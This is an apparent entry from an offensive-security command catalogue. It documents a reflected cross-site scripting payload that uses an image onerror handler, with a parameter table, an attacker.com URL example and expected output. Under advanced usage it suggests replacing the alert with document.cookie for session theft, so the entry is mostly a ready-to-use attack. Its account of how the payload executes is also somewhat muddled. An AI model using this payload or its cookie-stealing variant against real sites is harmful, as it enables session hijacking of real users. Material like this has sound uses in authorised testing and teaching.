---
id: cmd-uuid-2-1149144
data: <img src=x onerror=alert(1)>
tags:
  - xss
  - payload
type: command
output: Alert popup with '1' in the browser
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:12.515Z'
verified: false
validated: true
submitted: true
---
# embed-xss-payload-in-url-path

## Command

```html
<img src=x onerror=alert(1)>
```

## Description

This payload is embedded in the path of an attacker-controlled URL; when fetched and rendered by the server, it executes JavaScript via the onerror event, popping an alert for proof-of-concept XSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `src=x` | Invalid source to trigger onerror | Yes |
| `onerror=alert(1)` | JS code to execute on error | Yes |

## Examples

### Basic Usage

Embed in URL path: http://attacker.com/<img src=x onerror=alert(1)>.

### Advanced Usage

Replace alert(1) with document.cookie for session theft.

## Expected Output

Execution of alert(1), displaying a popup in the rendering browser.

## Related

- [[commands/access-vulnerable-endpoint-with-xss-payload]]
- [[procedures/Exploit-Reflected-XSS-via-Malicious-URL]]
